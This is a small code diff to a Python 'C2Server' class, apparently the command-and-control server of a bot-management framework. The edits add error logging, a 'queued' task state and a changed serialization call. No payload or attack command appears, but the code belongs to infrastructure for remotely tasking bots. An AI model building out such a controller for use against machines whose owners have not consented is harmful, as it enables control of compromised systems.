@@ -21,7 +21,9 @@ class C2Server(QBalancedServer):
         self.setDeviceModel(Bot)
         self.setObjectName("C2Server")
         self.logger = logging.getLogger(self.__class__.__name__)
+
         self.connected.connect(self.pre_connection)
+        self.error.connect(self.logger.error)
 
     @asyncSlot(int, dict)
     async def on_message(self, bot_id: int, message: dict):
@@ -39,7 +41,9 @@ class C2Server(QBalancedServer):
             task_id = message.get("task_id")
             task = bot.get_task_by_id(task_id)
             if task:
-                if state == "started":
+                if state == "queued":
+                    task.set_created(datetime.datetime.now())
+                elif state == "started":
                     task.set_running(datetime.datetime.now())
                 elif state == "finished":
                     task.set_finished(datetime.datetime.now(), message.get("result"), message.get("exit_code"))
@@ -118,9 +122,9 @@ class C2Server(QBalancedServer):
         info_obj = Info(bot_id, info)
         bot.on_info_received(info_obj)
         if bot_id == 0:
-            self.writeAll(info_obj.serialize())
+            self.writeAll(info_obj.create())
         else:
-            self.write(bot_id, info_obj.serialize())
+            self.write(bot_id, info_obj.create())
 
     @Slot(int, int)
     def stop_task(self, bot_id, task_id):
